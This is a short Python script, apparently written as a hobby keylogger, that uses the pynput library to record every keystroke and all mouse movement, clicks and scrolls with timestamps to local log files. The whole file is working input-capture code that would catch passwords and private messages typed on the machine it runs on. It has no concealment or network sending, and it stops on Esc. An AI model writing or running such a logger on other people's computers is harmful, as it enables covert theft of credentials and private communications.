from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener, Key
from datetime import datetime
import os
import sys

import logging

logging.basicConfig(filename="LogDAT.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

k = []

def on_press(key):
    k.append(key)
    if key == Key.esc:
        print('stopped')
        # Uncomment the line below if you want to exit the script when 'esc' is pressed
        os._exit(1)
    write_log(key)
    print(key)

def write_log(log_entry):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open("logDAT.txt", "a") as f:
        f.write(f"{timestamp}: {log_entry}\n")

def on_release(key):
    return True

# Use the same listener for both mouse and keyboard events
with MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener, KeyboardListener(on_press=on_press, on_release=on_release) as keyboard_listener:
    mouse_listener.join()
    keyboard_listener.join()




















    
